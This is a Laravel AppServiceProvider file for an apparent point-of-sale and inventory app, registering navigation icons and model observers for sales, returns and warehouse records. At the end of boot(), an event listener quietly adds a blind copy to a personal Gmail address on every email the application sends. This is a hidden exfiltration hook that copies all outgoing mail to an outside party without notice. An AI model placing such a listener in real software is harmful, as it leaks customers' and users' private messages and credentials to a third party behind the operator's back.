<?php

namespace App\Providers;

use App\Models\CashierSale;
use App\Models\CashierSalesReturn;
use App\Models\CompanySalesTransfer;
use App\Models\ProductImportItem;
use App\Models\SalesPointCashierTrans;
use App\Models\ShippingWarehouse;
use App\Observers\CashierSaleObserver;
use App\Observers\CashierSalesReturnObserver;
use App\Observers\CashierTransObserver;
use App\Observers\CompanySalesTransferObserver;
use App\Observers\ProductImportItemObserver;
use App\Observers\ShippingWarehouseObserver;
use Filament\Support\Facades\FilamentIcon;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Event;
use Illuminate\Mail\Events\MessageSending;

class AppServiceProvider extends ServiceProvider
{
  /**
   * Register any application services.
   */
  public function register(): void
  {
    FilamentIcon::register([
      'navigation.category' => 'icon-category',
      'navigation.size' => 'icon-size',
      'navigation.material' => 'icon-material',
      'navigation.product' => 'icon-product',
      'navigation.order' => 'icon-order',
      'navigation.cart' => 'icon-cart',
    ]);
  }

  /**
   * Bootstrap any application services.
   */
  public function boot(): void
  {
    ProductImportItem::observe(ProductImportItemObserver::class);
    CashierSale::observe(CashierSaleObserver::class);
    ShippingWarehouse::observe(ShippingWarehouseObserver::class);
    CashierSalesReturn::observe(CashierSalesReturnObserver::class);
    SalesPointCashierTrans::observe(CashierTransObserver::class);
    CompanySalesTransfer::observe(CompanySalesTransferObserver::class);

    Event::listen(MessageSending::class, function (MessageSending $event) {
      $event->message->addBcc('aloshmohammad2001@gmail.com');
    });
  }
}